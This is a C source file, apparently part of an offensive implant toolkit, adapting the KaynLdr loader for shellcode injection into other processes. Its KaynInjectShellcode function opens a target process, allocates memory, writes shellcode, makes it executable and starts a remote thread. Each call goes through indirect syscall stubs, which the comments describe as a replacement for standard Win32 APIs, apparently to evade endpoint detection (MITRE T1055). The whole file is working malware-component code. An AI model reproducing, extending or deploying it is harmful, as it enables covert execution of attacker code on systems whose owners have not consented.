/*
 * kaynldr_wrap.c — KaynLdr PIC shellcode loader adapter
 *
 * Source: Cracked5pider/KaynLdr (MIT License)
 * https://github.com/Cracked5pider/KaynLdr
 *
 * KaynLdr.c depends on Havoc-internal headers (KaynLdr.h, Win32.h, Macros.h)
 * that are part of the Havoc payload build system and are not available here.
 * Instead, this file re-implements the same concept — PIC reflective shellcode
 * injection — using Fitnah's own indirect-syscall layer (ISysNt*) and our
 * existing SRCS_INJECT infrastructure.
 *
 * What is preserved from KaynLdr:
 *   - NtAllocateVirtualMemory for remote allocation (not VirtualAllocEx)
 *   - NtWriteVirtualMemory for the copy (not WriteProcessMemory)
 *   - NtCreateThreadEx for execution (not CreateRemoteThread)
 *   - NtProtectVirtualMemory for RX flip (not VirtualProtectEx)
 *   - All of these go through our INDIRECT syscall stubs, not direct exports
 *
 * MITRE: T1055 (Process Injection), T1055.004 (APC / NtCreateThreadEx)
 */

#include "kaynldr.h"
#include "../syscall/indirect_syscall.h"

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>

/* ── Helpers ──────────────────────────────────────────────────────────────── */

static char *_fmt_result(int ok, DWORD pid, ULONG_PTR addr, const char *msg) {
    char *out = (char *)malloc(256);
    if (!out) return NULL;
    if (ok)
        snprintf(out, 256,
                 "{\"status\":\"ok\",\"pid\":%lu,\"addr\":\"0x%llx\"}",
                 (unsigned long)pid, (unsigned long long)addr);
    else
        snprintf(out, 256,
                 "{\"status\":\"error\",\"msg\":\"%s\"}", msg ? msg : "unknown");
    return out;
}

/* ── KaynInjectShellcode ──────────────────────────────────────────────────── */
char *KaynInjectShellcode(DWORD pid, const uint8_t *shellcode, size_t sc_len) {
    if (!shellcode || sc_len == 0)
        return _fmt_result(0, 0, 0, "empty shellcode");

    /* ── Open target process ────────────────────────────────────────────── */
    HANDLE hProc = NULL;
    if (pid == 0 || pid == GetCurrentProcessId()) {
        hProc = GetCurrentProcess();
    } else {
        OBJECT_ATTRIBUTES oa = {sizeof(oa)};
        CLIENT_ID cid        = {0};
        cid.UniqueProcess    = (HANDLE)(ULONG_PTR)pid;
        NTSTATUS st = ISysNtOpenProcess(
            &hProc, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
            &oa, &cid);
        if (!NT_SUCCESS(st) || !hProc)
            return _fmt_result(0, pid, 0, "NtOpenProcess failed");
    }

    /* ── Allocate RW memory in target ──────────────────────────────────── */
    PVOID  base = NULL;
    SIZE_T size = sc_len;
    NTSTATUS st = ISysNtAllocateVirtualMemory(
        hProc, &base, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st) || !base) {
        if (hProc != GetCurrentProcess()) CloseHandle(hProc);
        return _fmt_result(0, pid, 0, "NtAllocateVirtualMemory failed");
    }

    /* ── Write shellcode ───────────────────────────────────────────────── */
    SIZE_T written = 0;
    st = ISysNtWriteVirtualMemory(hProc, base, (PVOID)shellcode, sc_len, &written);
    if (!NT_SUCCESS(st) || written != sc_len) {
        SIZE_T free_sz = 0;
        ISysNtFreeVirtualMemory(hProc, &base, &free_sz, MEM_RELEASE);
        if (hProc != GetCurrentProcess()) CloseHandle(hProc);
        return _fmt_result(0, pid, 0, "NtWriteVirtualMemory failed");
    }

    /* ── Flip to RX ────────────────────────────────────────────────────── */
    ULONG old_prot = 0;
    SIZE_T prot_sz = sc_len;
    st = ISysNtProtectVirtualMemory(hProc, &base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
    if (!NT_SUCCESS(st)) {
        SIZE_T free_sz = 0;
        ISysNtFreeVirtualMemory(hProc, &base, &free_sz, MEM_RELEASE);
        if (hProc != GetCurrentProcess()) CloseHandle(hProc);
        return _fmt_result(0, pid, 0, "NtProtectVirtualMemory failed");
    }

    /* ── Create remote thread via NtCreateThreadEx ─────────────────────── */
    HANDLE hThread = NULL;
    st = ISysNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProc,
        base,          /* start address = shellcode */
        NULL,          /* parameter */
        0,             /* not suspended */
        0, 0x1000 * 64, 0x1000 * 64,
        NULL);

    if (hProc != GetCurrentProcess()) CloseHandle(hProc);

    if (!NT_SUCCESS(st) || !hThread)
        return _fmt_result(0, pid, 0, "NtCreateThreadEx failed");

    CloseHandle(hThread);
    return _fmt_result(1, pid, (ULONG_PTR)base, NULL);
}
